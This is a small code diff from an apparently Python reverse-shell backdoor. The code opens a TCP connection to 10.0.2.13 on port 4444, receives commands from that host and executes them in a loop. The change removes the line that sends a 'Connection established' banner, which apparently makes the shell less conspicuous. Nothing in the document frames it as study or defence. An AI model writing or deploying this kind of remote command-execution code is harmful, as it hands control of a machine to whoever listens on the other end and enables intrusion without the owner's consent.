@@ -11,9 +11,6 @@ def execute_system_command(command):
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(('10.0.2.13', 4444))
 
-sent_data = '\n[+] Connection established.\n'.encode()
-connection.send(sent_data)
-
 while True:
     command = connection.recv(1024).decode()
     command_result = execute_system_command(command)
